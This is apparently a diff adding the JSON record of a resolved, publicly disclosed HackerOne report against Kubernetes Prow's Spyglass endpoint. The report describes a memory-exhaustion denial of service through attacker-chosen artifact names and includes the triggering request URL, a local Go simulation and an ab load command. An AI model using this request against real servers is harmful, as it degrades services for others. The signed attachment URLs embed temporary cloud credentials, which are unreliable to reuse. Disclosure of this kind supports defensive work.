@@ -1,0 +1,153 @@
+{
+  "id": 833856,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzM4NTY=",
+  "url": "https://hackerone.com/reports/833856",
+  "title": "DoS for GCSArtifact.RealAll",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-29T12:30:23.076Z",
+  "submitted_at": "2020-03-29T12:30:23.076Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lazydog",
+    "url": "/lazydog",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-02-04T19:00:04.236Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-01-10T05:26:30.647Z",
+  "team_member_agreed_on_going_public_at": "2021-02-04T19:00:03.963Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\nI'm not be goot at english,\nif have anything don’t understand, please contact me.\n\nThanks!\n\n## Summary:\nattackers can control artifactName list make google storage client download large object cause denial of service.\n## Component Version:\nkubenetes/test-infra:master(SHA:fea5af139ecdac00e5efa46539bc80bd0f9e951c)\n\n## Steps To Reproduce:\n  1. request this url, we can see the http response is slowly.so i analyze the code process flow.\n```\nhttps://prow.k8s.io/spyglass/lens/buildlog/rerender?req={\"artifacts\":[\"k8s-test-cache.tar.gz\"],\"index\":0,\"src\":\"gcs/kubernetes-jenkins/cache/poc/\"}\n```{F764935}\n  2. in \"/spyglass/lens/\" endpoint handle function, we can control the req.artifacts params make google storage client download a large object in memory. the vuln code flow like this:\n\n```\ntest-infra/prow/cmd/deck/main.go:702  func handleArtifactView() ->\ntest-infra/prow/cmd/deck/main.go:1151 sg.FetchArtifacts(..., request.Artifacts) ->\ntest-infra/prow/spyglass/artifacts.go:119 s.GCSArtifactFetcher.artifact(..., artifactname) ->\netc..(path process, url sign)\ntest-infra/prow/cmd/deck/main.go:1175 lens.Body(artifacts) ->\ntest-infra/prow/spyglass/lenses/buildlog/lens.go:190 logLinesAll(artifact) ->\ntest-infra/prow/spyglass/lenses/buildlog/lens.go:213 artifact.ReadAll() ->\ntest-infra/prow/spyglass/gcsartifact.go:205 ioutil.ReadAll(reader)\n```\n{F764922}\n  3.ensure prow infra is not interrupted, i write the simple code to simulation the vuln code, and use `ab -n 30 -c 30 http://localhost:8090/download` command concurrent request website.\n```\npackage main\n\nimport (\n    \"net/http\"\n    \"fmt\"\n    \"io/ioutil\"\n    \"strings\"\n)\n\nfunc client() (r *http.Response, err error){\n    var res *http.Response\n    var hc = &http.Client{}\n    // req, err := http.NewRequest(\"GET\", \"https://storage.googleapis.com/kubernetes-jenkins/cache/poc/k8s-test-cache.tar.gz\", nil)\n    req, err := http.NewRequest(\"GET\", \"http://localhost/10MB.BIN\", nil)\n    if err != nil {\n        return nil, err\n    }\n\n    res, err = hc.Do(req)\n    if err != nil {\n        return nil, err\n    }\n\n    return res, nil\n}\n\nfunc download(w http.ResponseWriter, req *http.Request) {\n    res, err := client()\n    if err != nil {\n        fmt.Fprintf(w, \"err\")\n    }\n\n    defer res.Body.Close()\n\n    read, err := ioutil.ReadAll(res.Body)\n    if err != nil {\n        fmt.Fprintf(w, \"err\")\n    }\n\n    lines := strings.Split(string(read), \"\\n\")\n    data := strings.Join(lines, \"\")\n    fmt.Fprintf(w, data)\n}\n\nfunc main() {\n    http.HandleFunc(\"/download\", download)\n\n    http.ListenAndServe(\":8090\", nil)\n}\n```\nresult:\n{F764944}\n\n4.i think concurrent request the prow spyglass endpoint  also make server out of memory.\n\n## Impact\n\nattacker can send HTTP request to the prow can cause an a denial of service by control the fetcher download large object.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 764922,
+      "file_name": "ReadAll.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WEJgvoH5k5ttR8CBdAoqzVvF?response-content-disposition=attachment%3B%20filename%3D%22ReadAll.png%22%3B%20filename%2A%3DUTF-8%27%27ReadAll.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ733M5QWI%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T233142Z&X-Amz-Expires=3252&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD%2BWh%2BPq0wPmHUVBiVAaWKZVwYrTqLHYrfMF32wCmjB1gIgb3NXZQewlhy2UHr5YP6x%2BWd47%2Fbktczfj5Hn6dCaUKIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDPIBP%2FfPpevzZHFL5SqOBZyj3QiCfx4by1RXn%2FbSJ0uqarjHgAduBWk0uNVwVhQPpbEy%2BHoTjJ1rlh0JCr7bZo1AI9p2AekHBpO9EuRgSkm1wbV9STt8jM0jQioxkHj0cnu%2BX4rJ%2BtcyXRpqjl2rVqZYTLUgOEGqYuAvFtV5gknwjujRePsWvIc1SRKvPZD79DP1NnLl1xt%2BMqchWgCiHYAieEm3NXC3yM11VkgWBLYQwBkwpM6LFjms5jOCDDD8HNILWO5mp22Xg9nKhXbYjKe0msUMnr05A9PHc1ugMyJxuwGB0lYgqF3XA6FQRzkUTmcf%2FN91cJEIKjOVIx6%2BdYZonuW4OgorMQNXpbgOV5De1WHxLB91CwNr8hIEhDuMIBNfSGMFfQGo6C8QVX55SLCVvITyTO673hYxqpb9CpdqVgWbfTWn%2FmWfVfdHNnFys%2Bu4%2FDiUpqRARiglQmHWjyGIdcHUQ8Y395Q7aXIr96I9r21fobLslDQ4T09fL11Q7KtwwMhAyWzU2Ho1MVgIYPZBB%2Fm8oh2deNNYbhCIk6ZCr%2BWlOi67VDRxUSidTxZnWAQyFVYs289%2B1IQcDNv4H7j6CgMK53nxSV3oUD3TZfWJrPmhOuXs78CwDJ9S%2BsgQ1pHGzGok%2FGXxc2beSfHbMgA%2BaIqhQjeXY3O%2Bb6Sn81VTIKxRhDN49v0GacVgOIbqXJa32k6HBksoeAU242L1I%2Bp4%2Fh3mYDuMKxQ40ByxcxajLydWIxI0Ah%2BLyn7r3k4BcozqVx3wP5uR2Eb5wWf4zhaKQwZnB4v9WmH%2FcZMnIUYr7EvJ%2BSoWZ0cJ74HGIckt%2B1nVy%2FSMtOY%2Fo20IQKq3%2FL4fJp2lKMT8CmAgS%2FoMZaMjJL634klIIV2CYn8lfjCCxuLMBjqxARpDCWFwcvrjcYyWKprleZyRI7ouss9GnFJG6qLYniwke39a%2FAsOXoVDxWXcfReZAPBCrv%2FS3H2QWvm9WVLp81TVsk6ZpCqAn0V%2FGZNsNw2yCxr2BHqQguiHv6LnzZoWW%2F4tNDrwpybirY%2FLIoBY6jaZDMz%2BYCjQmzcX74gxpJ6Nbv9PDWbVC0%2FItkrczpWJizgIRPySdPliKpqJYWsBlD12NL2hVbQWR0xb95PhtT8%2B7Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6f3e053546dec9344dd64d2639998861b424805055b607bf40ae3b6d37539abc",
+      "file_size": 151119,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 764935,
+      "file_name": "slowly.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/DcX5ioHfvncsepiVRegi8Ej4?response-content-disposition=attachment%3B%20filename%3D%22slowly.png%22%3B%20filename%2A%3DUTF-8%27%27slowly.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ733M5QWI%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T233142Z&X-Amz-Expires=3252&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD%2BWh%2BPq0wPmHUVBiVAaWKZVwYrTqLHYrfMF32wCmjB1gIgb3NXZQewlhy2UHr5YP6x%2BWd47%2Fbktczfj5Hn6dCaUKIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDPIBP%2FfPpevzZHFL5SqOBZyj3QiCfx4by1RXn%2FbSJ0uqarjHgAduBWk0uNVwVhQPpbEy%2BHoTjJ1rlh0JCr7bZo1AI9p2AekHBpO9EuRgSkm1wbV9STt8jM0jQioxkHj0cnu%2BX4rJ%2BtcyXRpqjl2rVqZYTLUgOEGqYuAvFtV5gknwjujRePsWvIc1SRKvPZD79DP1NnLl1xt%2BMqchWgCiHYAieEm3NXC3yM11VkgWBLYQwBkwpM6LFjms5jOCDDD8HNILWO5mp22Xg9nKhXbYjKe0msUMnr05A9PHc1ugMyJxuwGB0lYgqF3XA6FQRzkUTmcf%2FN91cJEIKjOVIx6%2BdYZonuW4OgorMQNXpbgOV5De1WHxLB91CwNr8hIEhDuMIBNfSGMFfQGo6C8QVX55SLCVvITyTO673hYxqpb9CpdqVgWbfTWn%2FmWfVfdHNnFys%2Bu4%2FDiUpqRARiglQmHWjyGIdcHUQ8Y395Q7aXIr96I9r21fobLslDQ4T09fL11Q7KtwwMhAyWzU2Ho1MVgIYPZBB%2Fm8oh2deNNYbhCIk6ZCr%2BWlOi67VDRxUSidTxZnWAQyFVYs289%2B1IQcDNv4H7j6CgMK53nxSV3oUD3TZfWJrPmhOuXs78CwDJ9S%2BsgQ1pHGzGok%2FGXxc2beSfHbMgA%2BaIqhQjeXY3O%2Bb6Sn81VTIKxRhDN49v0GacVgOIbqXJa32k6HBksoeAU242L1I%2Bp4%2Fh3mYDuMKxQ40ByxcxajLydWIxI0Ah%2BLyn7r3k4BcozqVx3wP5uR2Eb5wWf4zhaKQwZnB4v9WmH%2FcZMnIUYr7EvJ%2BSoWZ0cJ74HGIckt%2B1nVy%2FSMtOY%2Fo20IQKq3%2FL4fJp2lKMT8CmAgS%2FoMZaMjJL634klIIV2CYn8lfjCCxuLMBjqxARpDCWFwcvrjcYyWKprleZyRI7ouss9GnFJG6qLYniwke39a%2FAsOXoVDxWXcfReZAPBCrv%2FS3H2QWvm9WVLp81TVsk6ZpCqAn0V%2FGZNsNw2yCxr2BHqQguiHv6LnzZoWW%2F4tNDrwpybirY%2FLIoBY6jaZDMz%2BYCjQmzcX74gxpJ6Nbv9PDWbVC0%2FItkrczpWJizgIRPySdPliKpqJYWsBlD12NL2hVbQWR0xb95PhtT8%2B7Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5ea9ad9ddee3bfac765f016ed5e41fec73198236ad37c82070c9d37a3d912778",
+      "file_size": 429095,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 764944,
+      "file_name": "oom.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VGzdsf82Q78ngWmbAoyygDVX?response-content-disposition=attachment%3B%20filename%3D%22oom.png%22%3B%20filename%2A%3DUTF-8%27%27oom.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ733M5QWI%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T233142Z&X-Amz-Expires=3252&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD%2BWh%2BPq0wPmHUVBiVAaWKZVwYrTqLHYrfMF32wCmjB1gIgb3NXZQewlhy2UHr5YP6x%2BWd47%2Fbktczfj5Hn6dCaUKIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDPIBP%2FfPpevzZHFL5SqOBZyj3QiCfx4by1RXn%2FbSJ0uqarjHgAduBWk0uNVwVhQPpbEy%2BHoTjJ1rlh0JCr7bZo1AI9p2AekHBpO9EuRgSkm1wbV9STt8jM0jQioxkHj0cnu%2BX4rJ%2BtcyXRpqjl2rVqZYTLUgOEGqYuAvFtV5gknwjujRePsWvIc1SRKvPZD79DP1NnLl1xt%2BMqchWgCiHYAieEm3NXC3yM11VkgWBLYQwBkwpM6LFjms5jOCDDD8HNILWO5mp22Xg9nKhXbYjKe0msUMnr05A9PHc1ugMyJxuwGB0lYgqF3XA6FQRzkUTmcf%2FN91cJEIKjOVIx6%2BdYZonuW4OgorMQNXpbgOV5De1WHxLB91CwNr8hIEhDuMIBNfSGMFfQGo6C8QVX55SLCVvITyTO673hYxqpb9CpdqVgWbfTWn%2FmWfVfdHNnFys%2Bu4%2FDiUpqRARiglQmHWjyGIdcHUQ8Y395Q7aXIr96I9r21fobLslDQ4T09fL11Q7KtwwMhAyWzU2Ho1MVgIYPZBB%2Fm8oh2deNNYbhCIk6ZCr%2BWlOi67VDRxUSidTxZnWAQyFVYs289%2B1IQcDNv4H7j6CgMK53nxSV3oUD3TZfWJrPmhOuXs78CwDJ9S%2BsgQ1pHGzGok%2FGXxc2beSfHbMgA%2BaIqhQjeXY3O%2Bb6Sn81VTIKxRhDN49v0GacVgOIbqXJa32k6HBksoeAU242L1I%2Bp4%2Fh3mYDuMKxQ40ByxcxajLydWIxI0Ah%2BLyn7r3k4BcozqVx3wP5uR2Eb5wWf4zhaKQwZnB4v9WmH%2FcZMnIUYr7EvJ%2BSoWZ0cJ74HGIckt%2B1nVy%2FSMtOY%2Fo20IQKq3%2FL4fJp2lKMT8CmAgS%2FoMZaMjJL634klIIV2CYn8lfjCCxuLMBjqxARpDCWFwcvrjcYyWKprleZyRI7ouss9GnFJG6qLYniwke39a%2FAsOXoVDxWXcfReZAPBCrv%2FS3H2QWvm9WVLp81TVsk6ZpCqAn0V%2FGZNsNw2yCxr2BHqQguiHv6LnzZoWW%2F4tNDrwpybirY%2FLIoBY6jaZDMz%2BYCjQmzcX74gxpJ6Nbv9PDWbVC0%2FItkrczpWJizgIRPySdPliKpqJYWsBlD12NL2hVbQWR0xb95PhtT8%2B7Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=97ba279e0c71eb4a07b38eb172fe2989829fe6c1e2e8ab5fe6cef9f6a545245e",
+      "file_size": 358028,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-02-09T05:26:30.716Z",
+  "allow_singular_disclosure_after": -158781912.18515465,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "nightm4re",
+    "0nlymohammed",
+    "thieff",
+    "mattharkonnen"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32522,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/test-infra",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
